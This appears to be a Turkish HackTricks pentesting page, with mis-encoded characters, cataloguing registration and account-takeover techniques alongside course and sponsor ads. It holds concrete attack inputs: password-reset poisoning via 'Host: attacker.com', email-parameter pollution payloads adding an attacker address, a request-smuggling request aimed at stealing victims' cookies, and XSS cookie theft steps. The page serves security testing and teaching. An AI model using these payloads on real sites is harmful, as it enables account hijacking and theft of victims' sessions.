# KayÄ±t ve Ele GeÃ§irme GÃ¼venlik AÃ§Ä±klÄ±klarÄ±

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na gÃ¶z atÄ±n (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini alÄ±n**](https://peass.creator-spring.com)
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'da **takip edin**.
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io), **karanlÄ±k aÄŸ** destekli bir arama motorudur ve ÅŸirketin veya mÃ¼ÅŸterilerinin **hÄ±rsÄ±z kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±mlar** tarafÄ±ndan **kompromize edilip edilmediÄŸini** kontrol etmek iÃ§in **Ã¼cretsiz** iÅŸlevler sunar.

WhiteIntel'in baÅŸlÄ±ca amacÄ±, bilgi Ã§alan kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±mlardan kaynaklanan hesap ele geÃ§irmeleri ve fidye yazÄ±lÄ±mÄ± saldÄ±rÄ±larÄ±yla mÃ¼cadele etmektir.

Websitesini ziyaret edebilir ve motorlarÄ±nÄ± **Ã¼cretsiz** deneyebilirsiniz:

{% embed url="https://whiteintel.io" %}

---

## KayÄ±t Ele GeÃ§irme

### Ã‡ift KayÄ±t

* Var olan bir kullanÄ±cÄ± adÄ± kullanarak oluÅŸturmayÄ± deneyin
* E-postayÄ± deÄŸiÅŸtirerek kontrol edin:
* bÃ¼yÃ¼k harf
* \+1@
* e-postada birkaÃ§ nokta ekleyin
* e-posta adÄ±nda Ã¶zel karakterler (%00, %09, %20)
* E-postadan sonra siyah karakterler ekleyin: `test@test.com a`
* victim@gmail.com@attacker.com
* victim@attacker.com@gmail.com

### KullanÄ±cÄ± AdÄ± SÄ±ralamasÄ±

Bir kullanÄ±cÄ± adÄ±nÄ±n uygulama iÃ§inde zaten kaydedilip kaydedilmediÄŸini anlamaya Ã§alÄ±ÅŸÄ±n.

### Åifre PolitikasÄ±

KullanÄ±cÄ± oluÅŸtururken ÅŸifre politikasÄ±nÄ± kontrol edin (zayÄ±f ÅŸifreler kullanÄ±lÄ±p kullanÄ±lamayacaÄŸÄ±nÄ± kontrol edin).\
Bu durumda kimlik bilgilerini brute force deneyebilirsiniz.

### SQL Enjeksiyonu

Hesap ele geÃ§irmelerini denemek veya kayÄ±t formlarÄ±ndan bilgi Ã§ekmek iÃ§in **SQL EnjeksiyonlarÄ±** yapmak iÃ§in [**bu sayfayÄ± kontrol edin**](sql-injection/#insert-statement).

### Oauth Ele GeÃ§irmeleri

{% content-ref url="oauth-to-account-takeover.md" %}
[oauth-to-account-takeover.md](oauth-to-account-takeover.md)
{% endcontent-ref %}

### SAML GÃ¼venlik AÃ§Ä±klÄ±klarÄ±

{% content-ref url="saml-attacks/" %}
[saml-attacks](saml-attacks/)
{% endcontent-ref %}

### E-posta DeÄŸiÅŸtirme

KayÄ±t olduktan sonra e-postayÄ± deÄŸiÅŸtirmeyi deneyin ve bu deÄŸiÅŸikliÄŸin doÄŸru bir ÅŸekilde doÄŸrulandÄ±ÄŸÄ±nÄ± veya rastgele e-postalara deÄŸiÅŸtirilebileceÄŸini kontrol edin.

### Daha Fazla Kontrol

* **Tek kullanÄ±mlÄ±k e-postalarÄ±** kullanÄ±p kullanamayacaÄŸÄ±nÄ±zÄ± kontrol edin
* **Uzun** **ÅŸifre** (>200) **DoS**'a neden olur
* Hesap oluÅŸtururken **hÄ±z sÄ±nÄ±rlarÄ±nÄ± kontrol edin**
* username@**burp\_collab**.net kullanÄ±n ve **geri Ã§aÄŸrÄ±yÄ±** analiz edin

## **Åifre SÄ±fÄ±rlama Ele GeÃ§irmesi**

### Referans AracÄ±lÄ±ÄŸÄ±yla Åifre SÄ±fÄ±rlama Jetonu SÄ±zÄ±ntÄ±sÄ± <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. E-posta adresinize ÅŸifre sÄ±fÄ±rlama isteÄŸi gÃ¶nderin
2. Åifre sÄ±fÄ±rlama baÄŸlantÄ±sÄ±na tÄ±klayÄ±n
3. Åifreyi deÄŸiÅŸtirmeyin
4. Herhangi bir 3. taraf web sitesine (Ã¶rneÄŸin: Facebook, twitter) tÄ±klayÄ±n
5. Burp Suite proxy'de isteÄŸi onaylayÄ±n
6. Referer baÅŸlÄ±ÄŸÄ±nÄ±n ÅŸifre sÄ±fÄ±rlama jetonunu sÄ±zdÄ±rÄ±p sÄ±zdÄ±rmadÄ±ÄŸÄ±nÄ± kontrol edin.

### Åifre SÄ±fÄ±rlama Zehirlenmesi <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Burp Suite'de ÅŸifre sÄ±fÄ±rlama isteÄŸini onaylayÄ±n
2. Burp Suite'de aÅŸaÄŸÄ±daki baÅŸlÄ±klarÄ± ekleyin veya dÃ¼zenleyin: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. DeÄŸiÅŸtirilmiÅŸ baÅŸlÄ±kla isteÄŸi yÃ¶nlendirin\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. _host baÅŸlÄ±ÄŸÄ±na_ dayalÄ± bir ÅŸifre sÄ±fÄ±rlama URL'si arayÄ±n: `https://attacker.com/reset-password.php?token=TOKEN`

### E-posta Parametresi AracÄ±lÄ±ÄŸÄ±yla Åifre SÄ±fÄ±rlama <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### API Parametrelerinde IDOR <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. SaldÄ±rgan kendi hesabÄ±yla giriÅŸ yapmalÄ± ve **Åifre DeÄŸiÅŸtir** Ã¶zelliÄŸine gitmelidir.
2. Burp Suite'u baÅŸlatÄ±n ve isteÄŸi Intercept edin.
3. Ä°steÄŸi tekrarlayÄ±cÄ± sekmesine gÃ¶nderin ve parametreleri dÃ¼zenleyin: KullanÄ±cÄ± KimliÄŸi/e-posta\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### ZayÄ±f Åifre SÄ±fÄ±rlama Jetonu <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Åifre sÄ±fÄ±rlama jetonu her seferinde rastgele oluÅŸturulmalÄ± ve benzersiz olmalÄ±dÄ±r.\
Jetonun sÃ¼resinin dolup dolmadÄ±ÄŸÄ±nÄ± veya her zaman aynÄ± olup olmadÄ±ÄŸÄ±nÄ± belirlemeye Ã§alÄ±ÅŸÄ±n, bazÄ± durumlarda oluÅŸturma algoritmasÄ± zayÄ±f olabilir ve tahmin edilebilir. AÅŸaÄŸÄ±daki deÄŸiÅŸkenler algoritma tarafÄ±ndan kullanÄ±labilir.

* Zaman DamgasÄ±
* KullanÄ±cÄ± KimliÄŸi
* KullanÄ±cÄ±nÄ±n E-postasÄ±
* Ad ve Soyad
* DoÄŸum Tarihi
* Kriptografi
* YalnÄ±zca SayÄ±
* KÃ¼Ã§Ã¼k jeton dizisi (karakterler arasÄ±nda \[A-Z,a-z,0-9])
* Jeton yeniden kullanÄ±mÄ±
* Jetonun son kullanma tarihi

### SÄ±zan Åifre SÄ±fÄ±rlama Jetonu <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Belirli bir e-posta iÃ§in API/UI kullanarak ÅŸifre sÄ±fÄ±rlama isteÄŸi tetikleyin, Ã¶rneÄŸin: test@mail.com
2. Sunucu yanÄ±tÄ±nÄ± inceleyin ve `resetToken` iÃ§in kontrol edin
3. ArdÄ±ndan, jetonu aÅŸaÄŸÄ±daki gibi bir URL'de kullanÄ±n: `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### KullanÄ±cÄ± AdÄ± Ã‡akÄ±ÅŸmasÄ± Yoluyla Åifre SÄ±fÄ±rlama <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. KurbanÄ±n kullanÄ±cÄ± adÄ±na, ancak kullanÄ±cÄ± adÄ±nÄ±n Ã¶nÃ¼ne ve/veya arkasÄ±na boÅŸluklar eklenmiÅŸ aynÄ± olan bir kullanÄ±cÄ± adÄ±yla sistemde kaydolun, Ã¶rneÄŸin: `"admin "`
2. KÃ¶tÃ¼ niyetli kullanÄ±cÄ± adÄ±nÄ±zla bir ÅŸifre sÄ±fÄ±rlama isteÄŸi isteyin.
3. E-postanÄ±za gÃ¶nderilen jetonu kullanÄ±n ve kurbanÄ±n ÅŸifresini sÄ±fÄ±rlayÄ±n.
4. Yeni ÅŸifre ile kurban hesabÄ±na baÄŸlanÄ±n.

Platform CTFd bu saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±zdÄ±.\
Bkz: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### XSS AracÄ±lÄ±ÄŸÄ±yla Hesap Ele GeÃ§irme <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Uygulama iÃ§inde veya Ã§erezler Ã¼st etki alanÄ±na sahipse alt etki alanÄ±nda bir XSS bulun: `*.domain.com`
2. Mevcut **oturum Ã§erezini** sÄ±zdÄ±rÄ±n
3. Ã‡erez kullanarak kullanÄ±cÄ± olarak kimlik doÄŸrulayÄ±n

### HTTP Ä°stek KaÃ§Ä±rma AracÄ±lÄ±ÄŸÄ±yla Hesap Ele GeÃ§irme <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1\. TÃ¼rÃ¼ne gÃ¶re HTTP Ä°stek KaÃ§Ä±rma (CL, TE, CL.TE) tespit etmek iÃ§in **smuggler** kullanÄ±n\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2\. `POST / HTTP/1.1`'i aÅŸaÄŸÄ±daki verilerle Ã¼zerine yazacak bir istek oluÅŸturun:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` hedef, kurbanlarÄ± burpcollab'a yÃ¶nlendirmek ve Ã§erezlerini Ã§almaktÄ±r\
3\. Son istek aÅŸaÄŸÄ±daki gibi olabilir
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
### CSRF AracÄ±lÄ±ÄŸÄ±yla Hesap Ele GeÃ§irme <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. CSRF iÃ§in bir payload oluÅŸturun, Ã¶rn: "Åifre deÄŸiÅŸikliÄŸi iÃ§in otomatik gÃ¶nderimli HTML formu"
2. Payload'u gÃ¶nderin

### JWT AracÄ±lÄ±ÄŸÄ±yla Hesap Ele GeÃ§irme <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token, bir kullanÄ±cÄ±yÄ± doÄŸrulamak iÃ§in kullanÄ±labilir.

* JWT'yi baÅŸka bir KullanÄ±cÄ± KimliÄŸi / E-posta ile dÃ¼zenleyin
* ZayÄ±f JWT imzasÄ±nÄ± kontrol edin

{% content-ref url="hacking-jwt-json-web-tokens.md" %}
[hacking-jwt-json-web-tokens.md](hacking-jwt-json-web-tokens.md)
{% endcontent-ref %}

## Referanslar

* [https://salmonsec.com/cheatsheet/account\_takeover](https://salmonsec.com/cheatsheet/account\_takeover)


## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io), **karanlÄ±k aÄŸ** destekli bir arama motorudur ve ÅŸirketin veya mÃ¼ÅŸterilerinin **hÄ±rsÄ±z kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±mlar** tarafÄ±ndan **kompromize edilip edilmediÄŸini** kontrol etmek iÃ§in **Ã¼cretsiz** iÅŸlevsellikler sunar.

WhiteIntel'in baÅŸlÄ±ca amacÄ±, bilgi Ã§alan kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±mlardan kaynaklanan hesap ele geÃ§irmeleri ve fidye yazÄ±lÄ±mÄ± saldÄ±rÄ±larÄ±yla mÃ¼cadele etmektir.

Websitesini ziyaret edebilir ve motorlarÄ±nÄ± **Ã¼cretsiz** deneyebilirsiniz:

{% embed url="https://whiteintel.io" %}


<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **ğŸ’¬ [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katÄ±lÄ±n veya** bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
